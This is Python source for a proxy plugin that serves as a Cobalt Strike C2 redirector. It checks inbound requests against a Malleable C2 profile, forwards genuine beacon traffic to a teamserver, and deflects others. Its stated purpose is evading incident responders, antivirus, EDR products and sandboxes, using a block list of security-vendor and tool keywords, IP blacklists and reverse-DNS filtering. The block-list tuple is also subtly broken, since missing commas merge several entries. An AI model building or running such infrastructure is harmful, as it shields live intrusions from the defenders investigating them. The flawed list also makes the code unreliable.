#!/usr/bin/python3
#
# This script acts as a HTTP/HTTPS reverse-proxy with several restrictions imposed upon which
# requests and from whom it should process, similarly to the .htaccess file in Apache2's mod_rewrite.
#
# malleable_redirector was created to resolve the problem of effective IR/AV/EDRs/Sandboxes evasion on the
# C2 redirector's backyard. 
#
# The proxy along with this plugin can both act as a CobaltStrike Teamserver C2 redirector, given Malleable C2
# profile used during the campaign and teamserver's hostname:port. The plugin will parse supplied malleable profile
# in order to understand which inbound requests may possibly come from the compatible Beacon or are not compliant with
# the profile and therefore should be misdirected. Sections such as http-stager, http-get, http-post and their corresponding 
# uris, headers, prepend/append patterns, User-Agent are all used to distinguish between legitimate beacon's request
# and some Internet noise or IR/AV/EDRs out of bound inquiries. 
#
# The plugin was also equipped with marvelous known bad IP ranges coming from:
#   curi0usJack and the others:
#   https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10
#
# Using a IP addresses blacklist along with known to be bad keywords lookup on Reverse-IP DNS queries and HTTP headers,
# is considerably increasing plugin's resiliency to the unauthorized peers wanting to examine protected infrastructure.
#
# Use wisely, stay safe.
#
# Example usage:
#   $ python3 proxy2.py -P 80/http -P 443/https -p plugins/malleable_redirector.py --profile jquery-c2.3.14.profile \
#       --teamserver-url 1.2.3.4:8080 -v
#
#   [INFO] 19:21:42: Loading 1 plugin...
#   [INFO] 19:21:42: Plugin "malleable_redirector" has been installed.
#   [INFO] 19:21:42: Preparing SSL certificates and keys for https traffic interception...
#   [INFO] 19:21:42: Using provided CA key file: ca-cert/ca.key
#   [INFO] 19:21:42: Using provided CA certificate file: ca-cert/ca.crt
#   [INFO] 19:21:42: Using provided Certificate key: ca-cert/cert.key
#   [INFO] 19:21:42: Serving http proxy on: 0.0.0.0, port: 80...
#   [INFO] 19:21:42: Serving https proxy on: 0.0.0.0, port: 443...
#   [INFO] 19:21:42: [REQUEST] GET /jquery-3.3.1.min.js
#   [INFO] 19:21:42: == Valid malleable http-get request inbound.
#   [INFO] 19:21:42: Plugin redirected request from [code.jquery.com] to [1.2.3.4:8080]
#   [INFO] 19:21:42: [RESPONSE] HTTP 200 OK, length: 5543
#   [INFO] 19:21:45: [REQUEST] GET /jquery-3.3.1.min.js
#   [INFO] 19:21:45: == Valid malleable http-get request inbound.
#   [INFO] 19:21:45: Plugin redirected request from [code.jquery.com] to [1.2.3.4:8080]
#   [INFO] 19:21:45: [RESPONSE] HTTP 200 OK, length: 5543
#   [INFO] 19:21:46: [REQUEST] GET /
#   [ERROR] 19:21:46: [DROP, reason:1] inbound User-Agent differs from the one defined in C2 profile.
#   [INFO] 19:21:46: [RESPONSE] HTTP 301 Moved Permanently, length: 212
#   [INFO] 19:21:48: [REQUEST] GET /jquery-3.3.1.min.js
#   [INFO] 19:21:48: == Valid malleable http-get request inbound.
#   [INFO] 19:21:48: Plugin redirected request from [code.jquery.com] to [1.2.3.4:8080]
#
# The above output contains a line pointing out that there has been an unauthorized, not compliant with our C2 
# profile inbound request, which got dropped due to incompatible User-Agent string presented:
#   [...]
#   [DROP, reason:1] inbound User-Agent differs from the one defined in C2 profile.
#   [...]
#
# Requirements:
#   - brotli
#
# Author:
#   Mariusz B. / mgeeky, '20
#   <mb@binary-offensive.com>
#

import re, sys
import os
import socket
import os.path
import ipaddress
from urllib.parse import urlparse, parse_qsl, parse_qs, urlsplit
from IProxyPlugin import *







MALLEABLE_BANNED_IPS = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'malleable_banned_ips.txt')

BANNED_AGENTS = (
    # Dodgy User-Agents words
    'curl', 'wget', 'python-urllib', 'lynx', 'slackbot-linkexpanding'

    # Generic bad words
    'security', 'scanning', 'scanner', 'defender', 'cloudfront', 'appengine-google'

    # Bots
    'googlebot', 'adsbot-google', 'msnbot', 'altavista', 'slurp', 'mj12bot',
    'bingbot', 'duckduckbot', 'baiduspider', 'yandexbot', 'simplepie', 'sogou',
    'exabot', 'facebookexternalhit', 'ia_archiver', 'virustotalcloud', 'virustotal'

    # EDRs
    'bitdefender', 'carbonblack', 'carbon', 'code42', 'countertack', 'countercept', 
    'crowdstrike', 'cylance', 'druva', 'forcepoint', 'ivanti', 'sentinelone', 
    'trend micro', 'gravityzone', 'trusteer', 'cybereason', 'encase', 'ensilo', 
    'huntress', 'bluvector', 'cynet360', 'endgame', 'falcon', 'fortil', 'gdata', 
    'lightcyber', 'secureworks', 'apexone', 'emsisoft', 'netwitness', 'fidelis', 

    # AVs
    'acronis', 'adaware', 'aegislab', 'ahnlab', 'antiy', 'secureage', 
    'arcabit', 'avast', 'avg', 'avira', 'bitdefender', 'clamav', 
    'comodo', 'crowdstrike', 'cybereason', 'cylance', 'cyren', 
    'drweb', 'emsisoft', 'endgame', 'escan', 'eset', 'f-secure', 
    'fireeye', 'fortinet', 'gdata', 'ikarussecurity', 'k7antivirus', 
    'k7computing', 'kaspersky', 'malwarebytes', 'mcafee', 'nanoav', 
    'paloaltonetworks', 'panda', '360totalsecurity', 'sentinelone', 
    'sophos', 'symantec', 'tencent', 'trapmine', 'trendmicro', 'virusblokada', 
    'anti-virus', 'antivirus', 'yandex', 'zillya', 'zonealarm', 
    'checkpoint', 'baidu', 'kingsoft', 'superantispyware', 'tachyon', 
    'totaldefense', 'webroot', 'egambit', 'trustlook', 
)

class MalleableParser:
    def __init__(self, logger):
        self.path = ''
        self.data = ''
        self.datalines = []
        self.logger = logger
        self.parsed = {}
        self.config = self.parsed

    def get_config(self):
        return self.config

    def parse(self, path):
        with open(path, 'r') as f:
            self.data = f.read().replace('\r\n', '\n')
            self.datalines = self.data.split('\n')

        pos = 0
        linenum = 0
        depth = 0
        dynkey = []
        parsed = self.parsed

        for line in self.datalines:
            linenum += 1

            assert len(dynkey) == depth, "Depth ({}) and dynkey differ ({})".format(depth, dynkey)

            if line.strip() == '': continue
            if line.lstrip().startswith('#'): 
                pos += len(line) + 1
                continue

            self.logger.dbg('[key: {}, line: {}, pos: {}] {}'.format(str(dynkey), linenum-1, pos, line[:100]))

            parsed = self.parsed
            for key in dynkey:
                parsed = parsed[key]

            matched = False

            # Finds: set name "value";
            m = re.match(r"set\s+(\w+)\s+(?=(?:(?<!\w)'(\S.*?)'(?!\w)|\"(\S.*?)\"(?!\w)))", line)
            if m:
                n = list(filter(lambda x: x != None, m.groups()[2:]))[0]
                self.logger.dbg('Extracted variable: [{}] = [{}]'.format(m.group(1), n))
                parsed[m.group(1)] = n.replace('\\\\', '\\')
                matched = 'set'
                continue

            # Finds: section { as well as variant-driven: section "variant" {
            m = re.match(r'^\s*([\w-]+)\s+(?:"[^"]+"\s+)?\{', line)
            if m:
                self.logger.dbg('Extracted section: [{}] '.format(m.group(1)))
                depth += 1
                dynkey.append(m.group(1))
                parsed[m.group(1)] = {}
                matched = 'section'
                continue

            if line.strip() == '}':
                depth -= 1
                matched = 'endsection'
                self.logger.dbg('Reached end of section {}'.format(dynkey.pop()))
                continue

            # Finds: [set] parameter ["value", ...];
            m = re.search(r'(?:([\w-]+)\s+(?=")".*")|(?:([\w-]+)(?=;))', line, re.I)
            if m:
                paramname = list(filter(lambda x: x != None, m.groups()))[0]
                restofline = line[line.find(paramname) + len(paramname):]
                values = []
                for n in re.finditer(r"(?=(?:(?<!\w)'(\S.*?)'(?!\w)|\"(\S.*?)\"(?!\w)))", restofline):
                    paramval = list(filter(lambda x: x != None, n.groups()[1:]))[0]
                    values.append(paramval.replace('\\\\', '\\'))

                if values == []:
                    values = ''
                elif len(values) == 1:
                    values = values[0]

                if paramname in parsed.keys():
                    if type(parsed[paramname]) == list:
                        parsed[paramname].append(values)
                    else:
                        parsed[paramname] = [parsed[paramname], values]
                else:
                    if type(values) == list:
                        parsed[paramname] = [values, ]
                    else:
                        parsed[paramname] = values

                self.logger.dbg('Extracted complex variable: [{}] = [{}]'.format(paramname, str(values)[:100]))
                matched = 'complexset'
                continue

            self.logger.err("Unexpected statement:\n\t{}".format(line))
            self.logger.err("\nParsing failed.")
            return False

        return True

class ProxyPlugin(IProxyPlugin):
    def __init__(self, logger, proxyOptions):
        self.is_request = False
        self.logger = logger
        self.proxyOptions = proxyOptions

        self.banned_ips = []

        with open(MALLEABLE_BANNED_IPS, 'r') as f:
            for line in f.readlines():
                l = line.strip()
                if l.startswith('#') or len(l) < 8: continue

                self.banned_ips.append(l)

        logger.info('Loaded {} blacklisted CIDRs.'.format(len(self.banned_ips)))


    @staticmethod
    def get_name():
        return 'malleable_redirector'

    def help(self, parser):
        if parser != None:
            parser.add_argument('--profile', 
                metavar='PATH', 
                help='(Required) Path to the Malleable C2 profile file.'
            )
            parser.add_argument('--teamserver-url', 
                metavar='URL', 
                help='(Required) Address where to redirect legitimate beacon requests, a.k.a. TeamServer\'s Listener bind address (in a form of host:port)'
            )
            parser.add_argument('--drop-action', 
                metavar='PATH', 
                help="What to do with the request originating from anyone else than the beacon: redirect (HTTP 301), reset TCP connection or act as a reverse-proxy? Valid values: 'reset', 'redirect', 'proxy'. Default: redirect", 
                default='redirect', 
                choices = ['reset', 'redirect', 'proxy']
            )
            parser.add_argument('--action-url', 
                metavar='URL', 
                help='If someone who is not a beacon hits the proxy, where to redirect him/where to proxy his requests. Default: https://google.com', 
                default = 'https://google.com'
            )
            parser.add_argument('--log-dropped', 
                help='Logs full dropped requests bodies.', 
                action = 'store_true'
            )

        else:
            if not self.proxyOptions['profile']:
                self.logger.fatal('Malleable C2 profile path must be specified!')

            self.malleable = MalleableParser(self.logger)
            if not self.malleable.parse(self.proxyOptions['profile']):
                self.logger.fatal('Could not parse specified Malleable C2 profile!')

            if not self.proxyOptions['action_url']:
                self.logger.fatal('Drop URL must be specified!')

            if not self.proxyOptions['teamserver_url']:
                self.logger.fatal('Teamserver URL must be specified!')

            try:
                u = urlparse(self.proxyOptions['teamserver_url'])
                scheme, _host = u.scheme, u.netloc
                if _host:
                    host, _port = _host.split(':')
                else:
                    host, _port = self.proxyOptions['teamserver_url'].split(':')
                port = int(_port)
                if port < 1 or port > 65535: raise Exception()
            except Exception as e:
                raise
                self.logger.fatal('Teamserver\'s URL does not follow <[https?://]host:port> scheme! {}'.format(str(e)))

            if (not self.proxyOptions['drop_action']) or (self.proxyOptions['drop_action'] not in ['redirect', 'reset', 'proxy']):
                self.logger.fatal('Drop action must be specified as either "reset", redirect" or "proxy"!')
            
            if self.proxyOptions['drop_action'] == 'proxy':
                if self.proxyOptions['action_url'] == '':
                    self.logger.fatal('Drop URL must be specified for proxy action - pointing from which host to fetch responses!')
                else:
                    self.logger.info('Will proxy requests from: {}'.format(self.proxyOptions['action_url']), color=self.logger.colors_map['cyan'])

    def redirect(self, req, target):
        # Passing the request forward.
        u = urlparse(req.path)
        scheme, netloc, path = u.scheme, u.netloc, (u.path + '?' + u.query if u.query else u.path)

        if not target.startswith('http'):
            target = 'https://' + target

        w = urlparse(target)
        scheme2, netloc2, path2 = w.scheme, w.netloc, (w.path + '?' + w.query if w.query else w.path)
        req.path = '{}://{}{}'.format(scheme2, netloc2, (u.path + '?' + u.query if u.query else u.path))

        self.logger.dbg('Redirecting to "{}"'.format(req.path))
        return None

    def request_handler(self, req, req_body):
        self.is_request = True
        if self.drop_check(req, req_body):
            if self.proxyOptions['drop_action'] == 'proxy' and self.proxyOptions['action_url']:
                return self.redirect(req, self.proxyOptions['action_url'])  
            return self.drop_action(req, req_body, None, None)

        return self.redirect(req, self.proxyOptions['teamserver_url'])

    def response_handler(self, req, req_body, res, res_body):
        self.is_request = False
        if self.drop_check(req, req_body):
            self.logger.dbg('Not returning body from response handler')
            return self.drop_action(req, req_body, res, res_body)

        # A nifty hack to make the proxy2 believe we actually modified the response
        # so that the proxy will not encode it to gzip (or anything specified) and just
        # return the response as-is, in an "Content-Encoding: identity" kind of fashion
        res.headers[proxy2_metadata_headers['override_response_content_encoding']] = 'identity'
        return res_body

    def drop_action(self, req, req_body, res, res_body):

        todo = ''
        if self.proxyOptions['drop_action'] == 'reset': todo = 'DROPPING'
        elif self.proxyOptions['drop_action'] == 'redirect': todo = 'REDIRECTING'
        elif self.proxyOptions['drop_action'] == 'proxy': todo = 'PROXYING'

        u = urlparse(req.path)
        scheme, netloc, path = u.scheme, u.netloc, (u.path + '?' + u.query if u.query else u.path)

        peer = req.client_address[0]

        try:
            resolved = socket.gethostbyaddr(req.client_address[0])[0]
            peer += ' ({})'.format(resolved)
        except:
            pass

        self.logger.err('[{} invalid request from {}] {} {}'.format(
            todo, peer, req.command, path
        ))

        if self.proxyOptions['log_dropped'] == True:
            req_headers = req.headers
            if req_body != None and len(req_body) > 0:
                req_body = '\r\n' + req_body
            else:
                req_body = ''

            request = '{} {} {}\r\n{}{}'.format(
                req.command, path, 'HTTP/1.1', req_headers, req_body
            )

            self.logger.err('\n\n{}'.format(request))

        if self.proxyOptions['drop_action'] == 'reset':
            return DropConnectionException('Not a conformant beacon request.')

        elif self.proxyOptions['drop_action'] == 'redirect':
            if self.is_request:
                return DontFetchResponseException('Not a conformant beacon request.')

            res.status = 301
            res.response_version = 'HTTP/1.1'
            res.reason = 'Moved Permanently'
            res_body = '''<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
<TITLE>301 Moved</TITLE></HEAD><BODY>
<H1>301 Moved</H1>
The document has moved
<A HREF="{}">here</A>.
</BODY></HTML>'''.format(self.proxyOptions['action_url'])

            res.headers = {
                'Server' : 'nginx',
                'Location': self.proxyOptions['action_url'],
                'Content-Type':'text/html; charset=UTF-8',
            }

            return res_body.encode()

        elif self.proxyOptions['drop_action'] == 'proxy':
            self.logger.dbg('Proxying forward...')

        if self.is_request: 
            return req_body

        return res_body

    def drop_check(self, req, req_body):
        # User-agent conformancy
        if req.headers.get('User-Agent') != self.malleable.config['useragent']:
            if self.is_request:
                self.logger.err('[DROP, reason:1] inbound User-Agent differs from the one defined in C2 profile.')
                self.logger.dbg('Inbound UA: "{}", Expected: "{}"'.format(
                    req.headers.get('User-Agent'), self.malleable.config['useragent']))
            return True

        # Banned words check
        for k, v in req.headers.items():
            kv = k.split('-')
            vv = v.split(' ') + v.split('-')
            for kv1 in kv:
                if kv1.lower() in BANNED_AGENTS:
                    self.logger.err('[DROP, reason:2] HTTP header name contained banned word: "{}"'.format(kv1))
                    return True

            for vv1 in vv:
                if vv1.lower() in BANNED_AGENTS:
                    self.logger.err('[DROP, reason:3] HTTP header value contained banned word: "{}"'.format(vv1))
                    return True

        for cidr in self.banned_ips:
            if ipaddress.ip_address(req.client_address[0]) in ipaddress.ip_network(cidr, False):
                self.logger.err('[DROP, reason:4a] client\'s IP address ({}) is blacklisted: ({})'.format(
                    req.client_address[0], cidr
                ))
                return True

        # Reverse-IP lookup check
        try:
            resolved = socket.gethostbyaddr(req.client_address[0])[0]
            for part in resolved.split('.')[:-1]:
                if part.lower() in BANNED_AGENTS:
                    self.logger.err('[DROP, reason:4b] client\'s reverse-IP lookup contained banned word: "{}"'.format(part))
                    return True

        except Exception as e:
            pass

        fetched_uri = ''
        fetched_host = req.headers['Host']

        for section in ['http-stager', 'http-get', 'http-post']:
            found = False
            for uri in ['uri', 'uri_x86', 'uri_x64']:
                if uri in self.malleable.config[section].keys():
                    _uri = self.malleable.config[section][uri]
                    if _uri in req.path: 
                        found = True

                        if 'client' in self.malleable.config[section].keys():
                            if 'header' in self.malleable.config[section]['client'].keys():
                                for header in self.malleable.config[section]['client']['header']:
                                    k, v = header
                                    if k.lower() == 'host':
                                        fetched_host = v
                                        break
                        break

            if found:
                if self._client_request_inspect(section, req, req_body): 
                    return True
                if self.is_request:
                    self.logger.info('== Valid malleable {} request inbound.'.format(section))
                break

        return False

    def _client_request_inspect(self, section, req, req_body):
        uri = req.path

        if section in self.malleable.config.keys():
            uris = []
            if 'uri_x86' in self.malleable.config[section].keys(): 
                uris.append(self.malleable.config[section]['uri_x86'])
            if 'uri_x64' in self.malleable.config[section].keys(): 
                uris.append(self.malleable.config[section]['uri_x64'])
            if 'uri' in self.malleable.config[section].keys(): 
                uris.append(self.malleable.config[section]['uri'])

            found = False
            exactmatch = True

            foundblocks = []
            blocks = ('metadata', 'id', 'output')

            for _block in blocks:
                if 'client' not in self.malleable.config[section].keys():
                    continue

                if _block not in self.malleable.config[section]['client'].keys(): 
                    #self.logger.dbg('No block {} in [{}]'.format(_block, str(self.malleable.config[section]['client'].keys())))
                    continue

                foundblocks.append(_block)
                if 'uri-append' in self.malleable.config[section]['client'][_block].keys() or \
                    'parameter' in self.malleable.config[section]['client'][_block].keys():
                    exactmatch = False

            for _uri in uris:
                if exactmatch == True and uri == _uri: 
                    found = True
                    break
                elif exactmatch == False:
                    if uri.startswith(_uri): 
                        found = True
                        break

            if not found:
                self.logger.dbg('URI not resembles any of the support by malleable profile ones.')
                return True

            self.logger.dbg('Inbound {} alike request. Validating it...'.format(section))

            for header in self.malleable.config[section]['client']['header']:
                k, v = header

                if k not in [k2 for k2 in req.headers.keys()]:
                    self.logger.err('[DROP, reason:5] HTTP request did not contain expected header: "{}"'.format(k))
                    return True

                if v not in [v2 for v2 in req.headers.values()]:
                    self.logger.err('[DROP, reason:6] HTTP request did not contain expected header value: "{}"'.format(v))
                    return True

            for _block in foundblocks:
                if _block in self.malleable.config[section]['client'].keys():
                    metadata = self.malleable.config[section]['client'][_block]

                    metadatacontainer = ''

                    if 'header' in metadata.keys():
                        if not metadata['header'] in req.headers.keys():
                            self.logger.err('[DROP, reason:7] HTTP request did not contain expected {} block header: "{}"'.format(_block, metadata['header']))
                            return True

                        if req.headers.keys().count(metadata['header']) == 1:
                            metadatacontainer = req.headers[metadata['header']]
                        else:
                            metadatacontainer = [v for k, v in req.headers.items() if k == metadata['header']]

                    elif 'parameter' in metadata.keys():
                        out = parse_qs(urlsplit(req.path).query)

                        paramname = metadata['parameter']
                        if metadata['parameter'] not in out.keys():
                            self.logger.err('[DROP, reason:8] HTTP request was expected to contain {} block with parameter in URI: "{}"'.format(_block, metadata['parameter']))
                            return True

                        metadatacontainer = [metadata['parameter'], out[metadata['parameter']][0]]

                    self.logger.dbg('Metadata container: {}'.format(metadatacontainer))

                    if 'prepend' in metadata.keys():
                        if type(metadata['prepend']) == list:
                            for p in metadata['prepend']:
                                if p not in metadatacontainer:
                                    self.logger.err('[DROP, reason:9] Did not found prepend pattern: "{}"'.format(p))
                                    return True
                        elif type(metadata['prepend']) == str:
                            if metadata['prepend'] not in metadatacontainer:
                                self.logger.err('[DROP, reason:9] Did not found prepend pattern: "{}"'.format(metadata['prepend']))
                                return True

                    if 'append' in metadata.keys():
                        if type(metadata['append']) == list:
                            for p in metadata['append']:
                                if p not in metadatacontainer:
                                    self.logger.err('[DROP, reason:10] Did not found append pattern: "{}"'.format(p))
                                    return True
                        elif type(metadata['append']) == str:
                            if metadata['append'] not in metadatacontainer:
                                self.logger.err('[DROP, reason:10] Did not found append pattern: "{}"'.format(metadata['append']))
                                return True

        self.logger.dbg('Valid request. Passing it through..') 
        return False
